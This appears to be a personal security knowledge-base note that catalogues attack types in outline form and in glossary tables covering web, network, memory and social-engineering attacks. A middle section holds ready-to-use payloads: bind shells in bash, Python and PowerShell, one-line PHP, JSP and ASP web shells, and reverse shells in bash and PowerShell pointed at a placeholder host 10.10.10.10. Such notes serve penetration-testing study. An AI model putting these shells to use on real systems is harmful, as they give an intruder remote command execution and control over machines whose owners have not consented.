---
category: list
subjects:
  - cybersecurity
full_form: NULL
acronym: NULL
---

## Identity and Access
### Credential Acquisition
- Brute Force
- Dictionary Attack
- Credential Stuffing
- Password Spraying
- Phishing

### Access Control Subversion
- [PTH]{Pass-The-Hash}
	- rainbow tables
- Spoofing
- HTTP Method Auth Bypass
- [BAC]{Broken Access Control}
- [IDOR]{Insecure Direct Object Reference}

## Code Execution and Flow Control
### Arbitrary Code Execution
- Buffer Overflow
	- Out-of-bounds Write
	- `printf '\\x%.2x' {0..255}`
	- `EXITFUNC=thread` -> avoid closing process when exiting shellcode
	- NOP slide
- Return-Oriented Programming
- Heap Smashing

### Arbitrary Command Execution
- [rce]{Remote Code Evaluation}
- Local Code Evaluation
	- log poisoning
- [SQLi]{SQL Injection}
	- Blind
	- Error Based
	- Time Based
	- Auth Bypass
	- Bypass Addslashes
- LDAP Injection
- Deserialization

### Client-Side Code Execution
- [XSS]{Cross-Site Scripting}
	- Reflected
	- Self
	- dom
	- Stored
- Client-Side Injection
- Clickjacking

## Data and Information
### Confidentiality and Integrity
- [MITM]{Man-In-The-Middle}
- Full Path Disclosure
- Local File Disclosure

### Denial-of-Service
- Resource Exhaustion
- Logic [DoS]{Denial-of-Service}
- Teardrop Attack
- Amplification Attacks

### Resource Path Manipulation
- Path Traversal
- Local File Inclusion
	- null byte
	- PHP Wrappers
- Remote File Inclusion
- Bypass upload
	- file extension
	- .htaccess
	- content type


https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file

Web Application & Injection Attacks

bind_shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

web_shell
```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

rev_shell
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

|   |   |
|---|---|
|**SQL Injection (SQLi)**|Exploiting a flaw in the application's input handling to inject malicious SQL commands into database queries. This allows for unauthorized data retrieval, modification, or potential command execution on the host server.|
|**Cross-Site Scripting (XSS)**|Injecting malicious JavaScript code into a webpage viewed by other users. This code executes in the victim's browser, enabling session hijacking, credential theft, or malicious actions on the user's behalf.|
|**OS Command Injection**|Injecting operating system commands into an application input that is subsequently executed by the host server's shell. This grants the attacker remote execution privileges on the server.|
|**Server-Side Request Forgery (SSRF)**|Exploiting a server's functionality to make arbitrary requests to resources within the internal network or to external third-party services. This can be used for port scanning, accessing internal services, or data exfiltration.|
|**Local File Inclusion (LFI)**|Exploiting a flaw that allows the application to include and display (read) arbitrary local files from the server's file system. This is often used to view sensitive configuration files or logs.|
|**Remote File Inclusion (RFI)**|Exploiting a flaw that allows the application to include and execute a file from a remote external server. This is a common method used to achieve remote code execution (RCE).|
|**XML External Entity (XXE)**|Exploiting a vulnerability in the XML parser to enable the processing of external entities. This can lead to LFI, SSRF, or denial-of-service (DoS) attacks.|
|**Cross-Site Request Forgery (CSRF)**|Tricking a logged-in victim's browser into sending an authenticated request to a vulnerable web application. This exploits the application's trust in the user's active session cookie.|
|**NoSQL Injection**|Similar to SQLi, but targets NoSQL databases by injecting malicious data into query operators or object constructions. This often bypasses authentication or allows data manipulation.|
|**LDAP Injection**|Exploiting flaws in input handling to inject malicious filters into LDAP queries. This allows for unauthorized viewing, modification, or deletion of data stored in the directory service.|
|**HTTP Parameter Pollution (HPP)**|Submitting multiple values for the same parameter in an HTTP request to tamper with the application's logic or internal data processing. This can be used to bypass WAFs or alter application behavior.|
|**Clickjacking (UI Redressing)**|Overlays a transparent malicious frame over a legitimate web page, tricking users into clicking on a hidden element. This aims to hijack user actions for unauthorized activity.|

Network & Protocol Attacks

|   |   |
|---|---|
|**Man-In-The-Middle (MITM)**|Intercepting, relaying, and potentially altering communication between two parties who believe they are communicating directly. This is commonly achieved via ARP poisoning or DNS spoofing.|
|**ARP Poisoning**|Sending false Address Resolution Protocol (ARP) messages over a local network. This links an attacker's MAC address with a legitimate IP address, allowing for MITM attacks.|
|**DNS Spoofing**|Falsifying DNS resolution records to redirect a user's request for a legitimate website to a malicious server. This is highly effective for phishing campaigns.|
|**Port Scanning**|Systematically querying a range of TCP and UDP ports on a target server to determine which services are active and accessible. This provides crucial information for subsequent exploitation.|
|**Denial-of-Service (DoS)**|Overwhelming a target system, service, or network with traffic or resource requests until it can no longer respond to legitimate requests. This severely impacts availability.|
|**Distributed Denial-of-Service (DDoS)**|A coordinated DoS attack originating from multiple compromised systems (botnets) to maximize the volume and impact of the attack traffic. This is extremely difficult to mitigate without specialized services.|
|**Packet Sniffing**|Capturing and inspecting data packets traveling across a computer network. This is used to harvest sensitive, unencrypted information like passwords or session tokens.|
|**Session Hijacking**|Stealing a valid user session token (e.g., cookie) to impersonate the user and gain access to their authenticated application session. This bypasses the need for the user's password.|
|**Smurf Attack**|A DDoS technique that uses a spoofed source IP address and ICMP echo requests (pings) directed at an intermediary network. This amplifies the response traffic back to the victim.|
|**Amplification Attack**|Leveraging a network protocol (like DNS or NTP) with a disproportionately large response to a small query. This reflects amplified traffic onto the target victim's network.|
|**Side-Channel Attack (Timing)**|Analyzing non-functional information, such as the time taken for a system to process cryptographic operations or database queries. This can leak secrets like key lengths or data presence.|

System & Memory Exploitation

|   |   |
|---|---|
|**Buffer Overflow (Stack/Heap)**|Injecting more data into a fixed-size memory buffer than it can hold, overwriting adjacent memory locations. This is often used to control the program's Instruction Pointer (IP) and achieve code execution.|
|**Return-Oriented Programming (ROP)**|A technique used to bypass memory execution prevention (DEP/NX) by chaining existing code snippets ("gadgets") within the program's memory. This constructs a malicious instruction set without injecting new code.|
|**Pass-The-Hash (PTH)**|Authenticating to a Windows service or system by using the stored password hash (NTLM or Kerberos) instead of the plaintext password. This is a common post-exploitation technique in Active Directory environments.|
|**Privilege Escalation**|Exploiting a vulnerability or misconfiguration to gain a higher level of access or permissions on a system than initially intended. This moves an attacker from a normal user to a system administrator.|
|**Insecure Deserialization**|Exploiting an application's process of converting data structures back from a serialized format (e.g., JSON, YAML) to execute arbitrary commands or logic. This often involves chaining "gadgets" in the application's code base.|
|**Race Condition**|Exploiting a flaw where the system's output depends on the timing of uncontrollable events. By manipulating execution order, an attacker can bypass authorization checks or trigger unintended state transitions.|
|**Code Injection (Generic)**|A broad category where an attacker introduces executable code into a running process's memory space or configuration. This often follows a successful buffer overflow or exploitation primitive.|
|**Rootkit Installation**|Installing stealthy software designed to conceal the existence of malicious processes, files, or network connections from system administrators. This maintains persistence and evasion.|
|**Reverse Shell**|A mechanism where the target machine initiates a connection back to the attacker's machine. This bypasses firewall restrictions that block inbound connections and establishes a command and control (C2) channel.|
|**Log Poisoning**|Injecting malicious data into a system or application log file, which is later processed or executed by another component. This is often a precursor to achieving LFI/RFI or RCE.|
|**Worm/Virus Propagation**|Designing malware to self-replicate and spread automatically across networks or systems. A worm uses network protocols, while a virus requires a host program to execute.|


Social Engineering & Access Attacks

|   |   |
|---|---|
|**Phishing**|Sending fraudulent communications that appear to come from a reputable source to trick individuals into revealing sensitive information or installing malware. This relies on psychological manipulation and trust.|
|**Spear Phishing**|A highly targeted phishing attempt customized for a specific individual or organization, often referencing detailed personal information to appear highly credible. This has a much higher success rate than general phishing.|
|**Whaling**|A spear phishing attack targeting high-profile senior executives within an organization (e.g., CEOs, CFOs). The content is often urgent and related to legal or financial matters.|
|**Vishing (Voice Phishing)**|Conducting a phishing attack via telephone or voice over IP (VoIP), often using automation or impersonating tech support or bank staff. This convinces the victim to provide sensitive data.|
|**Shoulder Surfing**|Directly observing a person entering sensitive data, such as a password or PIN, by looking over their shoulder. This is a simple, physical form of information gathering.|
|**Baiting**|Leaving a physical malware-infected device (e.g., USB stick) in a public place, relying on the victim's curiosity to plug it into their computer. This often leads to immediate system compromise.|
|**Tailgating**|Gaining unauthorized access to a restricted area by closely following an authorized person through a securely locked door. This requires social deception and quick timing.|
|**Brute Force**|Systematically trying every possible password or key combination until the correct one is found. This is computationally expensive but guarantees success if the key space is small.|
|**Credential Stuffing**|Utilizing large lists of usernames and passwords stolen from third-party data breaches. This exploits the common practice of users reusing passwords across multiple services.|
|**Broken Access Control (BAC)**|Exploiting authorization logic flaws to gain access to features or data intended for other users or higher-privileged roles. This covers a wide range of application-level permission bypasses.|
|**Insecure Direct Object Reference (IDOR)**|Directly accessing internal implementation objects (files, database keys, API endpoints) by manipulating an input parameter. This bypasses the intended access layer.|
|**Reverse Engineering**|Deconstructing software, hardware, or a protocol to extract design information, functionality, or embedded secrets. This is critical for discovering zero-day vulnerabilities in binaries.|



## Relevant Reading
- [[Information]]
- [[Vulnerability]]
- [[Exploit]]